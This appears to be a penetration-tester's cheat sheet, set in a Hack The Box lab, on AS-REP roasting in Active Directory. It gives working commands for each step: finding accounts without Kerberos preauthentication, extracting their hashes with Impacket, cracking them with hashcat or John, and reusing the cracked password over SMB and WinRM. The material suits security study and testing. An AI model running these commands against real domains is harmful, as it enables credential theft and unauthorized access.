# AS-REP Roasting

!!! tip "Tip"
    Always check for AS-REP roastable accounts early — it requires no credentials. `impacket-GetNPUsers example.com/ -dc-ip 10.10.10.10 -request` enumerates from Linux with no auth if null sessions work.

!!! note "From the lab"
    AS-REP roasting often finds accounts misconfigured during provisioning scripts. Check service accounts and CI/CD runner accounts first — pre-auth is commonly disabled for convenience.

---

## Preconditions

- Target user must have **"Do not require Kerberos preauthentication"** set
- You need a valid username and access to UDP/TCP 88 on the DC

---

## Step 1: Identify AS-REP Roastable Users

### Option A: PowerView

```powershell
Get-DomainUser -PreauthNotRequired
```

### Option B: BloodHound Query

```cypher
MATCH (u:User) WHERE u.dontreqpreauth=true RETURN u.name
```

---

## Step 2: Extract Hashes with Impacket

**Unauthenticated:**

```bash
python3 GetNPUsers.py htb.local/ -usersfile users.txt -dc-ip 10.10.110.146 -format hashcat -outputfile asrep.hash
```

**Authenticated:**

```bash
python3 GetNPUsers.py htb.local/user:Password1 -dc-ip 10.10.110.146 -request
```

Output format:

```text
$krb5asrep$23$bob@HTB.LOCAL:0c9c8a...
```

---

## Step 3: Offline Cracking

### Hashcat (mode 18200)

```bash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt --force
```

### John the Ripper

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep asrep.hash
```

---

## Step 4: Reuse Cracked Credentials

```bash
nxc smb 10.10.10.10 -u bob -p 'Summer2022!' -d htb.local --shares
```

WinRM:

```bash
nxc winrm 10.10.10.10 -u bob -p 'Summer2022!' -d htb.local --exec "whoami"
```

